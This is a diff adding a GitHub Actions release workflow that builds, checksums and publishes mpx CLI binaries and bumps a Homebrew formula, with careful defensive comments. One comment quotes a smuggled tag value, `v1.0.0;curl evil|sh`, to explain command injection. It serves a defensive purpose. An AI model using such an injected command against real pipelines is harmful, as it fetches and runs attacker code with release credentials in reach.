@@ -1,0 +1,277 @@
+name: Release
+
+# Tag-driven. `git tag v0.1.0 && git push --tags` builds every platform,
+# publishes them as a GitHub Release in the *releases* repo, and opens the
+# tap's formula bump.
+#
+# Why the artifacts land in another repo: this one holds the source and stays
+# private until the app ships, while `curl | sh` and Homebrew both need
+# anonymous downloads. `multiplex-term/multiplex-cli-releases` exists to be
+# the public half. That split is also why GITHUB_TOKEN is not enough — it is
+# scoped to this repository, so cross-repo publishing needs RELEASE_TOKEN
+# (see README's "Releasing" section for the exact scopes).
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: Existing tag to (re)build, e.g. v0.1.0
+        required: true
+
+env:
+  CARGO_TERM_COLOR: always
+  ARTIFACT_REPO: multiplex-term/multiplex-cli-releases
+
+# GITHUB_TOKEN reads this repository and nothing else; every write here goes
+# to another repo under RELEASE_TOKEN. Spelling that out means a compromised
+# step cannot quietly push to this one.
+permissions:
+  contents: read
+
+jobs:
+  resolve:
+    name: resolve version
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.pick.outputs.tag }}
+      version: ${{ steps.pick.outputs.version }}
+    steps:
+      - uses: actions/checkout@v4
+      # A tag name is not a safe string. `${{ }}` pastes it into the script
+      # *before* the shell sees it, so a tag like `v1.0.0;curl evil|sh` is a
+      # command, not an argument — and this job is one `needs:` away from
+      # RELEASE_TOKEN, which can write the Homebrew tap that every
+      # `brew install mpx` resolves. Everything below reaches tag names
+      # through the environment, where they stay data, and the shape check
+      # rejects anything that is not a version in the first place.
+      - id: pick
+        env:
+          RAW_TAG: ${{ inputs.tag || github.ref_name }}
+        run: |
+          set -euo pipefail
+          if ! printf '%s' "$RAW_TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "::error::refusing to release from tag '$RAW_TAG' — expected vMAJOR.MINOR.PATCH"
+            exit 1
+          fi
+          echo "tag=$RAW_TAG" >> "$GITHUB_OUTPUT"
+          echo "version=${RAW_TAG#v}" >> "$GITHUB_OUTPUT"
+      - name: tag matches Cargo.toml
+        env:
+          TAG: ${{ steps.pick.outputs.tag }}
+          VERSION: ${{ steps.pick.outputs.version }}
+        run: |
+          set -euo pipefail
+          manifest=$(grep -m1 '^version = ' Cargo.toml | cut -d'"' -f2)
+          if [ "$manifest" != "$VERSION" ]; then
+            echo "::error::tag $TAG does not match Cargo.toml version $manifest"
+            exit 1
+          fi
+
+  build:
+    name: ${{ matrix.target }}
+    needs: resolve
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # musl, statically linked: one Linux binary that runs on glibc
+          # distros and Alpine alike. A bind offer is often run on a server
+          # nobody wants to install a toolchain on.
+          - target: x86_64-unknown-linux-musl
+            os: ubuntu-latest
+            cross: true
+          - target: aarch64-unknown-linux-musl
+            os: ubuntu-latest
+            cross: true
+          - target: x86_64-apple-darwin
+            os: macos-latest
+            cross: false
+          - target: aarch64-apple-darwin
+            os: macos-latest
+            cross: false
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ needs.resolve.outputs.tag }}
+      - uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: ${{ matrix.target }}
+      - uses: Swatinem/rust-cache@v2
+        with:
+          key: release-${{ matrix.target }}
+      - if: matrix.cross
+        run: cargo install cross --locked
+      - name: build
+        run: |
+          if [ "${{ matrix.cross }}" = "true" ]; then
+            cross build --release --locked --target ${{ matrix.target }}
+          else
+            cargo build --release --locked --target ${{ matrix.target }}
+          fi
+      - name: package
+        id: package
+        env:
+          TAG: ${{ needs.resolve.outputs.tag }}
+        run: |
+          set -euo pipefail
+          name="mpx-$TAG-${{ matrix.target }}"
+          staging="$(mktemp -d)/$name"
+          mkdir -p "$staging"
+          cp "target/${{ matrix.target }}/release/mpx" "$staging/"
+          # The alias ships as a real copy, not a symlink: a tarball symlink
+          # would break on extraction paths that don't preserve them, and the
+          # binary is small enough that duplicating it is cheaper than the
+          # class of bug that causes.
+          cp "target/${{ matrix.target }}/release/mpx" "$staging/multiplex"
+          cp README.md LICENSE "$staging/"
+          tar -czf "$name.tar.gz" -C "$(dirname "$staging")" "$name"
+          echo "archive=$name.tar.gz" >> "$GITHUB_OUTPUT"
+      - name: smoke test (native targets only)
+        if: matrix.target == 'x86_64-unknown-linux-musl' || matrix.target == 'aarch64-apple-darwin'
+        run: |
+          # Never publish a binary nobody has run. --help exercises argument
+          # parsing, which is where a bad cross build usually shows up first.
+          ./target/${{ matrix.target }}/release/mpx --help > /dev/null
+          ./target/${{ matrix.target }}/release/mpx --version
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ${{ matrix.target }}
+          path: ${{ steps.package.outputs.archive }}
+          if-no-files-found: error
+
+  publish:
+    name: publish to releases repo
+    needs: [resolve, build]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/download-artifact@v4
+        with:
+          path: dist
+          merge-multiple: true
+      - name: checksums
+        working-directory: dist
+        run: |
+          set -euo pipefail
+          ls -1
+          # One file, sorted, so the tap and the install script can both read
+          # it and a diff between releases is legible.
+          sha256sum *.tar.gz | sort -k2 > SHA256SUMS
+          cat SHA256SUMS
+          test "$(grep -c . SHA256SUMS)" -eq 4
+      - name: release notes
+        env:
+          TAG: ${{ needs.resolve.outputs.tag }}
+        run: |
+          {
+            echo "\`mpx\` $TAG — the companion CLI for Multiplex."
+            echo
+            echo "Source lives in the private \`multiplex-cli\` repo until the app ships; this repository exists to host the downloadable builds."
+            echo
+            echo '```sh'
+            echo "brew install multiplex-term/tap/mpx                        # macOS or Linux"
+            echo "curl -fsSL https://multiplexterm.dev/install-mpx-cli | sh  # macOS or Linux"
+            echo '```'
+            echo
+            echo "Each archive carries \`mpx\`, a \`multiplex\` alias, the README, and the licence. Verify with \`SHA256SUMS\`."
+          } > NOTES.md
+      - name: publish
+        env:
+          GH_TOKEN: ${{ secrets.RELEASE_TOKEN }}
+          TAG: ${{ needs.resolve.outputs.tag }}
+        run: |
+          set -euo pipefail
+          if [ -z "${GH_TOKEN:-}" ]; then
+            echo "::error::RELEASE_TOKEN is not set — see the Releasing section of README.md"
+            exit 1
+          fi
+          # Idempotent: a re-run replaces the assets rather than failing, so a
+          # single bad platform build can be fixed without minting a new tag.
+          if gh release view "$TAG" --repo "$ARTIFACT_REPO" >/dev/null 2>&1; then
+            gh release upload "$TAG" dist/* --repo "$ARTIFACT_REPO" --clobber
+          else
+            gh release create "$TAG" dist/* \
+              --repo "$ARTIFACT_REPO" \
+              --title "mpx $TAG" \
+              --notes-file NOTES.md
+          fi
+
+  tap:
+    name: bump homebrew formula
+    needs: [resolve, publish]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          path: dist
+          merge-multiple: true
+      - name: checkout tap
+        uses: actions/checkout@v4
+        with:
+          # The repo carries Homebrew's mandatory homebrew- prefix; the tap
+          # itself — and every install line — stays multiplex-term/tap.
+          repository: multiplex-term/homebrew-tap
+          token: ${{ secrets.RELEASE_TOKEN }}
+          path: tap
+          # checkout leaves the token in tap/.git/config unless told not to,
+          # and the very next step runs bump.py — code from that repository.
+          # RELEASE_TOKEN can also write the public releases repo, so a
+          # compromised tap could read the credential out of the checkout it
+          # was handed and replace published release assets. The token now
+          # appears only in the push step, after tap code has already run.
+          persist-credentials: false
+      - name: checksums
+        # Recomputed rather than carried over: SHA256SUMS is written inside
+        # the publish job and never uploaded as an artifact, and these are the
+        # same tarballs, so the digests are the same bytes either way.
+        working-directory: dist
+        run: sha256sum *.tar.gz | sort -k2 > SHA256SUMS
+      - name: rewrite formula
+        # The rewrite lives in the tap as a tested script, not as regexes
+        # inlined here: the formula is what every `brew install` resolves, so
+        # the thing that edits it deserves its own unit tests (tap CI runs
+        # them) rather than being a heredoc nobody can execute locally.
+        env:
+          TAG: ${{ needs.resolve.outputs.tag }}
+          VERSION: ${{ needs.resolve.outputs.version }}
+        run: |
+          set -euo pipefail
+          python3 tap/script/bump.py \
+            --version "$VERSION" \
+            --tag "$TAG" \
+            --checksums dist/SHA256SUMS \
+            --formula tap/Formula/mpx.rb
+          cat tap/Formula/mpx.rb
+      - name: open bump PR
+        env:
+          GH_TOKEN: ${{ secrets.RELEASE_TOKEN }}
+          TAG: ${{ needs.resolve.outputs.tag }}
+          VERSION: ${{ needs.resolve.outputs.version }}
+        run: |
+          set -euo pipefail
+          cd tap
+          branch="bump-mpx-$VERSION"
+          git config user.name "multiplex-release"
+          git config user.email "release@multiplexterm.dev"
+          git checkout -b "$branch"
+          if git diff --quiet; then
+            echo "formula already current — nothing to bump"
+            exit 0
+          fi
+          git commit -am "mpx $VERSION"
+          # The checkout deliberately kept no credential, so supply one now —
+          # after bump.py, the tap's own code, has already run. An auth header
+          # rather than a token in the remote URL, which `git remote -v` and
+          # any push error would echo; and not on the command line, where the
+          # runner's process list would carry it.
+          git config --local "http.https://github.com/.extraheader" \
+            "AUTHORIZATION: basic $(printf 'x-access-token:%s' "$GH_TOKEN" | base64 | tr -d '\n')"
+          git push -u origin "$branch"
+          # A PR rather than a push to main: the formula is what every `brew
+          # install` resolves, so a bad rewrite should be reviewable before it
+          # reaches anyone.
+          gh pr create --fill --base main \
+            --title "mpx $VERSION" \
+            --body "Automated bump from multiplex-cli $TAG. Checksums come from that release's SHA256SUMS."
